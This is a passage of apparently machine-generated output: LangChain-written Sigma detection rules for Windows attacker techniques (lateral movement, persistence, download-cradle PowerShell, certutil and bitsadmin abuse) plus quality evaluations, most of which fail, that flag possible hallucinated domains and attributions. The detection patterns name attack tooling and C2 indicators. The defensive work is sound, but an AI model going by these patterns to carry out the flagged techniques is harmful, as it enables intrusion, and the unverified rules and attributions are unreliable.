            "Image|endswith": "\\at.exe",
            "CommandLine|contains": [
              "\\\\",
              ":"
            ]
          },
          "condition": "selection_schtasks_create or selection_at"
        },
        "falsepositives": [
          "Legitimate administrative use of schtasks.exe or at.exe for system maintenance",
          "Scheduled task creation via automated IT management tools (e.g., Group Policy, SCCM)"
        ],
        "level": "high",
        "tags": [
          "attack.t1053.005",
          "attack.persistence",
          "custom.windows",
          "custom.schtasks",
          "custom.at",
          "custom.command_line"
        ],
        "ttp_id": "unknown",
        "technique_name": "Scheduled Task/Job",
        "generation_method": "langchain",
        "id": "3b66dcce-f412-484e-b6a5-cec788fd31d2"
      },
      {
        "title": "Account Discovery via Command Line Tools",
        "description": "Detects account discovery activity using common command line tools such as net, dsquery, and wmic. This behavior is often used by adversaries to enumerate local and domain accounts during post-compromise reconnaissance.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_net_user": {
            "Image|endswith": "\\net.exe",
            "CommandLine|contains": [
              "user",
              "group",
              "localgroup",
              "accounts"
            ]
          },
          "selection_dsquery": {
            "Image|endswith": "\\dsquery.exe",
            "CommandLine|contains": [
              "user",
              "group",
              "computer"
            ]
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": [
              "useraccount",
              "group",
              "netuser"
            ]
          },
          "condition": "selection_net_user or selection_dsquery or selection_wmic"
        },
        "falsepositives": [
          "Legitimate administrative enumeration of user or group accounts by system administrators",
          "Automated IT management tools that query user/group information for maintenance or auditing"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1087",
          "custom.detection-rule",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Account Discovery",
        "generation_method": "langchain",
        "id": "252ef574-c8c7-4ae7-8b11-8a56839c80d2"
      },
      {
        "title": "Remote Services Activity via Common Administration Tools",
        "description": "Detects remote services activity using common administration tools and command-line patterns associated with lateral movement techniques.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_sc": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": [
              "\\",
              "config",
              "start"
            ]
          },
          "selection_psexec": {
            "Image|endswith": "\\psexec.exe"
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": [
              "process",
              "call",
              "create"
            ]
          },
          "selection_mstsc": {
            "Image|endswith": "\\mstsc.exe",
            "CommandLine|contains": [
              "/v:"
            ]
          },
          "selection_ssh": {
            "Image|endswith": "\\ssh.exe",
            "CommandLine|contains": [
              "-L",
              "-R"
            ]
          },
          "selection_winrm": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Enter-PSSession",
              "Invoke-Command",
              "New-PSSession"
            ]
          },
          "condition": "selection_sc or selection_psexec or selection_wmic or selection_mstsc or selection_ssh or selection_winrm"
        },
        "falsepositives": [
          "Legitimate administrative use of sc.exe, psexec.exe, wmic.exe, mstsc.exe, ssh.exe, or PowerShell remoting by system administrators",
          "Automated IT management tools using remote execution for patching or configuration management"
        ],
        "level": "high",
        "tags": [
          "attack.t1021",
          "attack.lateral_movement",
          "detection.rule",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote Services",
        "generation_method": "langchain",
        "id": "4549a407-0835-434b-888c-9513ba152441"
      },
      {
        "title": "Screen Capture Activity Detection",
        "description": "Detects potential screen capture activity on Windows systems by monitoring execution of known screenshot utilities and command lines containing screen capture related keywords.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_snippingtool": {
            "Image|endswith": "\\snippingtool.exe"
          },
          "selection_greenshot": {
            "Image|endswith": "\\greenshot.exe"
          },
          "selection_nircmd": {
            "Image|endswith": "\\nircmd.exe",
            "CommandLine|contains": [
              "savescreenshot"
            ]
          },
          "selection_ffmpeg": {
            "Image|endswith": "\\ffmpeg.exe",
            "CommandLine|contains": [
              "-f",
              "gdigrab",
              "-i",
              "desktop"
            ]
          },
          "selection_generic": {
            "CommandLine|contains": [
              "screenshot",
              "capture",
              "screen",
              "printscreen",
              "grab"
            ]
          },
          "condition": "selection_snippingtool or selection_greenshot or selection_nircmd or selection_ffmpeg or selection_generic"
        },
        "falsepositives": [
          "Legitimate use of Snipping Tool or Greenshot by users for taking screenshots.",
          "Use of ffmpeg for video recording or screen capture in authorized workflows.",
          "System administrators using nircmd for automated screenshot tasks.",
          "Scripts that capture the screen for documentation or testing purposes."
        ],
        "level": "high",
        "tags": [
          "attack.t1113",
          "attack.collection",
          "custom.screen_capture",
          "custom.windows",
          "custom.process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Screen Capture",
        "generation_method": "langchain",
        "id": "c21eb8ea-f6a3-4be5-8aea-aa2ff90b7bd3"
      },
      {
        "title": "Persistence via Registry Run Keys Modification",
        "description": "Detects processes that add or modify entries in the Registry Run Keys (HKLM or HKCU Run/RunOnce) which are commonly used for persistence. The rule matches usage of reg.exe or PowerShell commands that target these specific registry paths.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_reg": {
            "Image|endswith": "\\reg.exe",
            "CommandLine|contains": [
              "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
              "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Set-ItemProperty",
              "New-ItemProperty",
              "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
              "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            ]
          },
          "condition": "selection_reg or selection_powershell"
        },
        "falsepositives": [
          "Legitimate software installers that add Run key entries",
          "Windows Update or system component updates",
          "Administrative scripts that configure startup programs",
          "Antivirus or security tools that use Run keys for persistence"
        ],
        "level": "medium",
        "tags": [
          "attack.persistence",
          "attack.t1547.001",
          "attack.registry"
        ],
        "ttp_id": "unknown",
        "technique_name": "Registry Run Keys",
        "generation_method": "langchain",
        "id": "65fb4ceb-8d95-4068-a7b7-d7dae60edc45"
      },
      {
        "title": "Remote Desktop Protocol (RDP) Activity Detection",
        "description": "Detects usage of Remote Desktop Protocol tools and commands indicative of lateral movement via RDP sessions. This rule looks for execution of common RDP client binaries and command-line utilities used to manage RDP sessions.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_mstsc": {
            "Image|endswith": "\\mstsc.exe"
          },
          "selection_rdpclip": {
            "Image|endswith": "\\rdpclip.exe"
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "query",
              "session",
              "tscon",
              "tsdiscon"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-ComputerName",
              "-Credential",
              "Enter-PSSession"
            ]
          },
          "condition": "selection_mstsc or selection_rdpclip or selection_cmd or selection_powershell"
        },
        "falsepositives": [
          "Legitimate administrative use of Remote Desktop Connection (mstsc.exe) for remote management.",
          "System processes that invoke rdpclip.exe for clipboard redirection during normal RDP sessions.",
          "Administrators using cmd.exe or PowerShell to query or manage existing RDP sessions."
        ],
        "level": "medium",
        "tags": [
          "attack.t1021.001",
          "attack.lateral_movement",
          "custom.remote-desktop",
          "custom.windows"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote Desktop Protocol",
        "generation_method": "langchain",
        "id": "646367a9-d1a5-4725-9274-7730813d38e0"
      },
      {
        "title": "Suspicious Office Process Spawning Command Shells (Phishing)",
        "description": "Detects potential phishing activity where Microsoft Office applications (WINWORD or OUTLOOK) spawn command-line interpreters or PowerShell with suspicious arguments, indicating possible malicious macro execution.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_office_cmd": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": "\\cmd.exe"
          },
          "selection_office_powershell": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "Invoke-WebRequest",
              "DownloadFile",
              "System.Net.WebClient"
            ]
          },
          "selection_outlook_powershell": {
            "ParentImage|endswith": "\\OUTLOOK.EXE",
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "Invoke-WebRequest"
            ]
          },
          "condition": "selection_office_cmd or selection_office_powershell or selection_outlook_powershell"
        },
        "falsepositives": [
          "Legitimate Office macros that legitimately invoke command-line tools for automation",
          "IT administrators running scripts from Office documents for internal tooling",
          "User-initiated PowerShell or cmd sessions launched from Office via trusted add-ins"
        ],
        "level": "high",
        "tags": [
          "attack.t1566",
          "attack.initial_access",
          "attack.phishing",
          "custom.windows",
          "custom.sysmon",
          "custom.process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Phishing",
        "generation_method": "langchain",
        "id": "18f0a0c9-06c2-4556-94e1-0fb1ac849385"
      }
    ]
  },
  "evaluation": {
    "status": "success",
    "summary": {
      "rules_evaluated": 31,
      "average_quality_score": 0.624,
      "passing_rules": 1,
      "failing_rules": 30,
      "langchain_evaluations": 147,
      "fallback_evaluations": 0,
      "errors": 0,
      "processing_time_ms": 32300.246000000003
    },
    "evaluation_results": [
      {
        "rule_title": "Proxy Tool Execution Using FRP, LCX or Socks5 Protocol",
        "rule_id": "801637e7-544f-49c3-b142-757d70c7bae0",
        "quality_score": 0.675,
        "status": "fail",
        "strengths": [
          "The rule targets specific and relevant command-line indicators for known proxy tools (FRP, LCX) which are commonly abused in C2 activity",
          "Includes filtering out common browsers in the SOCKS5 detection logic, reducing potential false positives from legitimate browser proxy use",
          "Well-structured detection logic with clear separation of conditions for different tools",
          "Log source is specific (Sysmon process creation on Windows), ensuring high-fidelity data input",
          "Tags are comprehensive and include MITRE ATT&CK mapping (T1090) and custom identifiers for tracking"
        ],
        "weaknesses": [
          "Detection coverage is limited by lack of real-world verification; rule has not been tested against actual attack data",
          "The inclusion of 'm00nlight.top' in the command-line detection introduces a hardcoded domain not linked to the TTP description, which may be a hallucination or overly specific, reducing generalizability",
          "Relies heavily on exact command-line arguments which may be obfuscated or modified by attackers",
          "No verification result available, increasing risk of undetected gaps in coverage"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to validate detection capability and tune the rule based on observed behavior",
          "Remove or contextualize 'm00nlight.top' unless it is a known IOA tied to the TTP; otherwise, it may cause missed detections or false negatives",
          "Consider adding file hash or signed/unsigned binary checks to improve precision",
          "Expand coverage to include child processes or network connections associated with proxy behavior for deeper context",
          "Add exceptions for legitimate administrative tools or development environments where FRP/LCX may be used, to further reduce false positives"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Command and Control via Proxy Server m00nlight.top",
        "rule_id": "875e7826-72a4-4f00-bf6d-2b0d61fe38fd",
        "quality_score": 0.675,
        "status": "fail",
        "strengths": [
          "The rule targets a specific and known malicious domain (m00nlight.top) associated with C2 activity, increasing relevance.",
          "Covers multiple common command-line tools (cmd, PowerShell, curl, wget, certutil, bitsadmin) often abused in C2 scenarios.",
          "Uses efficient string matching (contains, endswith) which ensures good performance in most SIEMs.",
          "Includes relevant MITRE ATT&CK tagging (T1090 - Proxy) for better threat context."
        ],
        "weaknesses": [
          "Detection coverage is low due to lack of real-world verification; rule may not actually catch the intended TTP.",
          "The domain 'm00nlight.top' is hardcoded and not referenced in the TTP info (id: unknown, name: Proxy), which introduces potential hallucination.",
          "Highly specific to one domain, making the rule brittle and easily bypassed by adversaries changing domains.",
          "No fallback or generic behavioral pattern (e.g., proxy usage, unusual outbound connections) if the domain changes."
        ],
        "suggestions": [
          "Replace hardcoded domain with a lookup table or indicator list that can be updated dynamically.",
          "Add generic behavioral detections (e.g., suspicious child processes initiating outbound network connections via proxy-like domains or IPs).",
          "Conduct real-world testing or simulation to verify detection capability and tune the rule accordingly.",
          "Include additional context such as network connection events (Sysmon Event ID 3) correlated with process creation to improve accuracy and reduce false positives."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.8,
          "efficiency": 0.9,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Fast Reverse Proxy (FRP) Tool Execution",
        "rule_id": "e8ba782e-52af-48a2-9041-7722ff3b0b52",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Clear focus on known malicious tool (FRP) with specific binary names",
          "Uses multiple detection conditions (process, command-line args, network protocols) to increase confidence",
          "Includes relevant MITRE ATT&CK tags for T1102 (Command and Control) and T1090 (Exfiltration over Alternative Protocol)",
          "Acknowledges legitimate use cases in false positives, helping analysts with triage",
          "Rule logic combines process image path with command-line indicators, reducing trivial bypasses"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 rule effectiveness is unproven in actual environment",
          "Detection coverage score reduced due to lack of verification (CRITICAL requirement not met)",
          "Potential for false positives due to reliance on generic command-line substrings like 'http', 'tcp', 'type=' which may appear in non-malicious contexts",
          "No use of parent-child process context or user context, which could improve precision",
          "Uses 'contains' on common strings (e.g., 'http') that could lead to noise"
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to verify detection capability and tune logic accordingly",
          "Add constraints to command-line arguments by requiring combinations (e.g., '--server_addr' AND '--token') to reduce false positives",
          "Include network connection conditions (e.g., Sysmon Event ID 3) to correlate with outbound connections to rare destinations",
          "Consider adding file hash or digital signature checks if known benign versions are signed",
          "Refine selection_frp_network_call to avoid matching benign tools that use 'tcp' or 'http' in config syntax",
          "If possible, integrate domain/IP indicators from threat intel, but only if confirmed in TTP context"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Command and Scripting Interpreter Abuse via Common Tools",
        "rule_id": "6005777b-4036-4ba2-9ab3-48b3d38538b0",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Covers multiple common tools associated with command and scripting interpreter abuse (cmd.exe, certutil.exe, bitsadmin.exe, at.exe)",
          "Uses specific command-line indicators (e.g., /c, -decode, /transfer) that increase detection fidelity",
          "Leverages Sysmon process creation logs, which provide rich context for behavioral analysis",
          "Includes relevant false positives in metadata, showing awareness of operational impact",
          "Well-structured detection logic with clear separation of tool-based selections"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection capability is unproven in practice",
          "Detection coverage score reduced due to lack of verification (CRITICAL: no events detected implies likely failure in real environment)",
          "Relies on exact command-line arguments; adversaries may use obfuscation or alternative syntax to bypass",
          "at.exe is deprecated on modern Windows systems; limited coverage for current environments",
          "No use of parent-child process context (e.g., suspicious spawning processes) to improve accuracy"
        ],
        "suggestions": [
          "Perform real-world testing and validation using representative attack simulations (e.g., via Atomic Red Team)",
          "Enhance detection logic with parent process context (e.g., cmd spawned from Office apps or web browsers)",
          "Add support for PowerShell and other modern interpreters to improve coverage",
          "Include obfuscation-aware detection (e.g., use of ^, encoded commands, or variable usage)",
          "Replace or supplement at.exe detection with schtasks.exe, which is more commonly used today",
          "Consider integrating file integrity monitoring or network connection correlation to reduce false positives"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Command and Scripting Interpreter Activity by Dalbit Group",
        "rule_id": "b2a8415c-6a89-48a1-8eed-804b83071778",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule covers multiple common tools used in command and scripting interpreter attacks (e.g., bitsadmin, certutil, cmd, at, Metasploit)",
          "Condition logic is clear and modular using named selections",
          "False positives are thoughtfully documented, acknowledging legitimate use cases",
          "Rule is mapped to MITRE ATT&CK (T1059) and tagged with threat group (Dalbit)",
          "Uses Sysmon process creation logs, which are rich for behavioral detection"
        ],
        "weaknesses": [
          "No real-world verification was performed, so detection efficacy is unknown and must be penalized per guidelines",
          "The TTP ID is listed as 'unknown' and tactic is missing, reducing traceability to MITRE framework",
          "Metasploit detection relies solely on command-line keywords (e.g., 'msfvenom', 'meterpreter') which may not appear in obfuscated or staged payloads",
          "Rule does not include other interpreters like PowerShell, WMI, or MSHTA, which are common in T1059",
          "No source or context provided for 'Dalbit Group' \u2014 may be a hallucination or unverified attribution",
          "No filtering on user context, parent-child process relationships, or network indicators to reduce false positives"
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to verify detection coverage and tune the rule",
          "Add detection logic for other scripting interpreters (PowerShell, wscript, cscript, mshta) to improve coverage of T1059",
          "Enhance Metasploit detection with entropy checks, suspicious argument patterns, or known payload artifacts",
          "Include parent process anomalies (e.g., Office apps spawning cmd.exe) to increase precision",
          "Add environment-based suppression (e.g., exclude known testing systems for Metasploit)",
          "Use structured threat intelligence for attribution instead of unverified group names",
          "Complete MITRE mapping by filling in correct TTP ID and tactic (e.g., Execution)"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detected Malware Backdoor via Suspicious Process Creation",
        "rule_id": "1f4109c7-5058-49a3-8bc2-039e9714c780",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Covers multiple suspicious process creation patterns associated with backdoor activity",
          "Includes relevant command-line indicators like base64, -enc, iex, and DownloadString commonly used in malicious scripts",
          "Targets high-risk child processes such as powershell.exe, rundll32.exe, and mshta.exe",
          "Considers suspicious parent processes (e.g., lsass.exe, svchost.exe) spawning script hosts",
          "Well-documented false positives list aids in tuning"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 rule effectiveness is unproven",
          "High potential for false positives due to broad command-line keywords (e.g., 'http', 'Run')",
          "Lacks specificity \u2014 does not include known IOCs or behavioral sequences unique to backdoors",
          "Relies on generic patterns that may miss obfuscated or novel techniques",
          "No constraints on argument order or context, increasing noise"
        ],
        "suggestions": [
          "Conduct real-world testing with simulated backdoor executions to validate detection capability",
          "Narrow command-line conditions using regex or ordered word sequences to reduce false positives",
          "Add process argument count or length thresholds to detect obfuscation",
          "Include network connection correlation (e.g., process creating outbound connection post-execution)",
          "Incorporate image file hash or signed/unsigned binary checks to improve precision"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exploitation for Client Execution via Korean Groupware Solution",
        "rule_id": "0be85fc8-fbb9-4130-8f57-044da7a8e83c",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule uses multiple detection conditions (process creation, parent-child relationships, and command-line indicators) to increase confidence in detecting exploitation attempts.",
          "Focuses on high-risk child processes (e.g., cmd.exe, powershell.exe) commonly abused in post-exploitation, improving relevance.",
          "Includes case-insensitive matching via |contains for groupware process names, increasing resilience to naming variations.",
          "Well-documented false positives are acknowledged, showing awareness of operational impact."
        ],
        "weaknesses": [
          "No real-world verification was performed, so detection efficacy against actual attack behavior is unproven.",
          "The rule relies on generic command-line indicators (e.g., 'http', 'base64', '/c') that are common in legitimate scripts, increasing false positive risk.",
          "No specific TTP ID or MITRE ATT&CK technique mapping is provided (TTP ID is 'unknown'), reducing traceability and context.",
          "Potential for hallucinated logic: the rule assumes exploitation leads to direct execution of scripting hosts, but this may not align with known exploitation chains for Korean groupware vulnerabilities."
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability and tune logic accordingly.",
          "Refine command-line indicators with more specific patterns (e.g., base64-encoded PowerShell, UNC paths to external shares) to reduce false positives.",
          "Add specific MITRE ATT&CK mapping (e.g., T1203 External Remote Services) if applicable to improve context and alignment.",
          "Consider adding network connection correlation (e.g., outbound connections from groupware process) to strengthen detection logic.",
          "Include field normalization or regex patterns to avoid reliance on substring matching alone, improving precision."
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Server Software Vulnerability Exploitation Attempt",
        "rule_id": "dd2ea64d-3167-4009-aebf-f0f6ff8c1d06",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Targets relevant server processes commonly exploited (e.g., w3wp.exe, java.exe)",
          "Includes multiple suspicious child processes associated with post-exploitation activities",
          "Condition combines process lineage and CLI indicators, increasing contextual relevance",
          "Covers common command-line utilities used in exploitation (e.g., certutil, bitsadmin, PowerShell -enc)",
          "Well-documented false positives, showing awareness of operational impact"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection capability is unproven",
          "Detection coverage score reduced due to lack of verification (per critical rule)",
          "Broad CommandLine keyword list may trigger on benign scripts (e.g., 'echo', 'start')",
          "No use of sigma rule fields like `fields` or `output` for completeness",
          "Relies on generic indicators without specific TTP alignment (e.g., no IOCs, no specific attack patterns from known exploits)"
        ],
        "suggestions": [
          "Conduct real-world or emulation-based testing to validate detection efficacy",
          "Narrow suspicious CLI keywords with context (e.g., '-enc' only in PowerShell, not all processes)",
          "Add field lists to ensure required data is collected",
          "Include specific known malicious patterns from public exploits (e.g., Log4Shell, ProxyShell) if applicable",
          "Consider adding user context or network connection correlation to reduce false positives"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Remote Access Tool Configuration via FRP INI File",
        "rule_id": "422a931a-f258-4f1c-904d-96cd0d801d18",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Rule targets relevant process names (frpc.exe, frps.exe) associated with FRP tooling",
          "Uses Sysmon file and process creation data, which is effective for detecting configuration file manipulation",
          "Includes contextual tags mapping to MITRE ATT&CK (T1210, command-and-control)",
          "Condition logic covers both file modification and process execution, increasing detection breadth",
          "Acknowledges legitimate use cases in false positives section, aiding analyst triage"
        ],
        "weaknesses": [
          "No real-world verification performed, so detection efficacy is unproven",
          "Detection logic may miss renamed or obfuscated binaries if not strictly named frpc.exe/frps.exe",
          "Relies on CommandLine containing 'frp', which could be evaded via argument manipulation or encoding",
          "Potential for false positives in dev/admin environments not sufficiently mitigated by filters",
          "Rule was generated by 'langchain' - possible hallucination risk; no confirmation FRP is used by 'Dalbit' group as stated"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability",
          "Add file path conditions to reduce false positives (e.g., block common dev tool directories)",
          "Include hash monitoring or signed/unsigned binary checks to detect sideloading or tampering",
          "Enrich rule with network connection correlation (e.g., outbound connections post INI creation)",
          "Validate threat actor attribution (Dalbit group) and FRP usage through trusted sources to avoid misinformation"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detected Malware Downloader via Command Line Tool",
        "rule_id": "afc27d9a-59ec-4ad5-949a-bcc1abe5b78f",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Covers multiple common downloader tools (cmd, PowerShell, certutil, bitsadmin, curl, wget)",
          "Uses specific command-line indicators associated with malicious activity",
          "Includes relevant false positives in metadata, showing awareness of operational impact",
          "Well-structured detection logic with clear conditions for each tool"
        ],
        "weaknesses": [
          "Lacks real-world verification; no events detected in SIEM, which undermines confidence in detection efficacy",
          "Broad command-line keyword matching (e.g., 'http', 'start', 'echo') may miss obfuscated or novel variants",
          "No correlation with parent-child process relationships or network connections, increasing risk of evasion",
          "Relies on clear-text command-line arguments, which attackers may obfuscate"
        ],
        "suggestions": [
          "Incorporate parent process context (e.g., cmd.exe spawned by Office apps) to improve precision",
          "Add network connection correlation to confirm outbound download attempts",
          "Include obfuscation-resistant patterns (e.g., base64 decoding, encoded commands)",
          "Validate rule in production environment with red team testing or real telemetry",
          "Consider adding thresholds or frequency-based triggers to reduce noise"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Create or Modify System Process via Command Line Tools",
        "rule_id": "90e8f8e4-5d00-4e96-9de4-2364efc8729a",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule covers multiple common command-line tools (sc.exe, PowerShell, wmic.exe, schtasks.exe) associated with creating or modifying system processes",
          "Detection logic includes specific command-line arguments tied to service manipulation, increasing relevance to the targeted TTP",
          "Well-documented false positives are acknowledged, showing awareness of operational environment noise",
          "Uses precise Sysmon process creation logging with clear field mappings (Image, CommandLine)"
        ],
        "weaknesses": [
          "No real-world verification was performed, so detection efficacy is unproven in practice",
          "Rule may generate false positives due to legitimate administrative use of these tools, especially in enterprise environments",
          "Lacks additional context such as user privilege level or parent process, which could reduce false positives",
          "Relies solely on command-line content matching without normalization or regex for obfuscation resistance"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to validate detection capability and tune logic accordingly",
          "Add conditions to filter out known administrative users, hosts, or signed Microsoft binaries where appropriate",
          "Enhance command-line detection with case-insensitive regex patterns to catch obfuscated commands (e.g., 'New-Service' written as 'nEw-SeRvIcE')",
          "Include additional context such as User, IntegrityLevel, or ParentImage to improve signal-to-noise ratio",
          "Consider integrating with other data sources (e.g., PowerShell logging, Event ID 4688) for corroboration"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Command and Scripting Interpreter - CMD Execution",
        "rule_id": "ba01febb-e92b-4942-8884-c6c3da33a2b7",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets process creation events with Sysmon, which is a reliable source for detecting cmd.exe execution",
          "Includes command-line arguments as part of detection logic, increasing specificity for malicious use of cmd.exe",
          "Covers common indicators of scripted or automated command execution (e.g., /c, /k, pipes, redirection)",
          "Well-documented false positives, showing awareness of operational context"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 rule effectiveness is unproven in practice",
          "Detection coverage score reduced due to lack of verification; per instructions, unverified rules must score below 5 if no confirmation of detection",
          "Relies on command-line arguments which may be obfuscated or avoided by attackers",
          "Does not account for alternative paths or case variations explicitly (e.g., Cmd.exe, CMD.EXE) though Sigma processors may handle this"
        ],
        "suggestions": [
          "Perform real-world testing or simulation to verify detection capability against known TTPs",
          "Consider adding normalization or case-insensitive matching explicitly if not handled by the backend",
          "Augment with additional behavioral indicators (e.g., child processes, network connections) to reduce false positives",
          "Include context enrichment options (e.g., user context, parent process) to improve detection accuracy",
          "Explore use of named pipes, encoded commands, or suspicious scripting patterns to increase coverage of obfuscated attacks"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detected Use of Bitsadmin for Execution",
        "rule_id": "d8be6cb7-8e22-47ea-8bdf-b248674a24fd",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Rule targets a legitimate execution technique commonly abused by adversaries",
          "Uses precise field conditions (Image ends with, CommandLine contains) for accurate detection",
          "Includes relevant MITRE ATT&CK tagging (T1197)",
          "Acknowledges legitimate use cases in false positives list"
        ],
        "weaknesses": [
          "No real-world verification performed, so detection efficacy is unproven",
          "Detection logic may miss obfuscated or parameter-heavy command lines",
          "Relies solely on process name and basic command line match, which could be evaded",
          "No use of parent-child process context or argument analysis"
        ],
        "suggestions": [
          "Conduct real-world testing to validate detection capability",
          "Enhance detection logic with additional conditions such as specific bitsadmin job creation or transfer commands",
          "Add parent process context (e.g., cmd.exe, powershell.exe) to improve precision",
          "Consider using regular expressions to capture obfuscated or encoded command line usage",
          "Include network connection correlation if available to strengthen detection confidence"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detected Use of Certutil for Execution",
        "rule_id": "2198544a-0942-4b97-b993-07ee86cc6007",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets known malicious command-line arguments associated with certutil.exe abuse, which are commonly used in real-world attacks",
          "Uses Sysmon process creation logs, which provide detailed visibility into process execution and command-line activity",
          "Includes relevant MITRE ATT&CK tags (T1105, T1218) that align with the intended detection purpose",
          "Condition logic is simple and efficient, reducing processing overhead in the SIEM"
        ],
        "weaknesses": [
          "No real-world verification was performed, so effectiveness against actual attack behavior is unproven",
          "Relies on command-line arguments that may be used in legitimate administrative tasks, increasing false positive risk",
          "Lacks additional context such as parent process, user context, or network indicators to reduce false positives"
        ],
        "suggestions": [
          "Conduct real-world testing of the rule using controlled simulations of certutil abuse to validate detection capability",
          "Enhance the rule with additional filtering conditions such as suspicious parent processes (e.g., mshta.exe, wscript.exe) or execution from temporary directories",
          "Consider adding event frequency thresholds or behavioral analytics to reduce false positives from legitimate use",
          "Document known benign certutil usage patterns in the environment to support tuning and alert triage"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Scheduled Task Creation or Execution via at.exe",
        "rule_id": "20a883b3-e877-4a3d-b607-304f7afd4327",
        "quality_score": 0.7,
        "status": "pass",
        "strengths": [
